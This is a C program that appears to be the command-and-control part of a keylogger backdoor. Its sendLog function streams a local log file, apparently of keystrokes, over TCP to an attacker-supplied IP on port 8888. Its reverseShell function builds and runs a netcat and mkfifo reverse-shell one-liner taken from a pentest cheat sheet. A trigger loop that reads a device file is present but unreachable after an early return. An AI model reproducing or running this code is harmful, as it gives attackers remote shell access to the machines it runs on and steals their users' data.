#include <errno.h> 
#include <netdb.h> 
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <paths.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define DEVICE "/dev/cd"
#define LOGFILE "/log.txt"
#define PORT 8888

int sendLog(char*);
void reverseShell(char *);

int main(int argc, char *argv[]) {
    int fd;
    char buf[100];
    char cmd[100];
    if (argc != 2) {
        exit(1);
    }
    sendLog(argv[1]);
    return 0;
    while (1) {
        if ((fd = open(DEVICE, O_RDWR)) != -1) {
            read(fd, buf, 100);
            if (strncmp(buf, "key", 3) == 0) {
                if (fork() == 0) {
                    //printf("Sending log\n");
                    sendLog(argv[1]);
                    exit(0);
                }
            }
            else if (strncmp(buf, "shell", 5) == 0) {
                if (fork() == 0) {
                    //printf("Sending shell\n");
                    //sprintf(cmd, "python /remote.py %s %d", argv[1], PORT);
                    //system(cmd);
                    reverseShell(argv[1]);
                    return 0;
                }
            }
            else {
                sleep(1);
            }
        }
        close(fd);
    }
}

int sendLog(char* ip) {
    int sockfd, numbytes;  
    struct hostent *he;
    struct sockaddr_in their_addr; /* connector's address information */


    if ((he=gethostbyname(ip)) == NULL) {  /* get the host info */
        //herror("gethostbyname");
        return 1;
    }

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        //perror("socket");
        return 1;
    }

    their_addr.sin_family = AF_INET;      /* host byte order */
    their_addr.sin_port = htons(PORT);    /* short, network byte order */
    their_addr.sin_addr = *((struct in_addr *)he->h_addr);
    bzero(&(their_addr.sin_zero), 8);     /* zero the rest of the struct */

    if (connect(sockfd, (struct sockaddr *)&their_addr, \
                                          sizeof(struct sockaddr)) == -1) {
        //perror("connect");
        return 1;
    }
    FILE *log = fopen(LOGFILE, "r");
    if (log == NULL) {
        //printf("File not found");
        return 1;
    }
    char sendbuf[100] = {0};
    while (fgets(sendbuf,100,log) != NULL) {
        //printf("Sending: %s\n", sendbuf);
        while (send(sockfd, sendbuf, 100, 0) == -1){
              //perror("send");
              continue;
        }
        usleep(100000);

    }

    close(sockfd);

    return 0;
}

void reverseShell(char *getIP){

	//Hardcoded  ip and port
	//Listen by nc -lvp <port details>
	//http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
	
	char header[100]="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ";
	char ip[100];
	char port[100];
	char footer[50]=" >/tmp/f";
	
	//copy argv[1] into buffer 
	strcpy(ip,getIP);
	//convert integer PORT to string and save it to buffer
	sprintf(port,"%d",PORT);
	
	//create payload
	strcat(header, ip);
	strcat(header, " ");
	strcat(header, port);
	strcat(header, footer);	
    
    //printf("%s\n",header);
    system(header);

}
